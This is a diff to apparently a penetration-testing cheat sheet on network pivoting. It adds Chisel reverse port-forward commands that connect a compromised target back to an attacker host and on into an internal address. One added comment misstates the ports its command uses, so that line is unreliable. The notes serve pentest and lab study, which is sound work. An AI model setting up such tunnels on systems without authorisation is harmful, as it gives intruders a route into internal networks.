@@ -21,7 +21,7 @@ sshuttle -vr parzival@$ip $targetSubnet/24
 
 1\. Download the [latest Chisel binaries](https://github.com/jpillora/chisel)
 
-> Note, you will need a binary placed on your attacking system and one to be uploaded to the target system.
+> Note, you will need the Chisel binary placed on both your attacking system the target system.
 
 2\. On the attacking system:
 
@@ -42,13 +42,17 @@ sshuttle -vr parzival@$ip $targetSubnet/24
 1\. On the attacking system:
 
 ```bash
-./chisel server 9000 -reverse
+./chisel server 8000 -reverse
 ```
 
 2\. On the target system:&#x20;
 
 ```bash
-.\chisel client $attackerip:9000 R:$localport:127.0.0.1:$remoteport
+# Listen on Kali 80, forward to localhost port 80 on client
+.\chisel client $attackerip:8000 R:1337:127.0.0.1:1337
+
+# Listen on Kali 4444, forward to 10.10.10.240 port 80
+.\chisel client $attackerip:8000 R:4444:10.10.10.240:80
 ```
 
 #### Verification
@@ -76,7 +80,7 @@ nmap -sT -Pn -n $port
 ```
 
 {% hint style="warning" %}
-You do not need this if utilizing SOCKS5 as it supports both ICMP and DNS.
+You do not need this when utilizing SOCKS5 as it supports both ICMP and DNS.
 {% endhint %}
 
 ### References
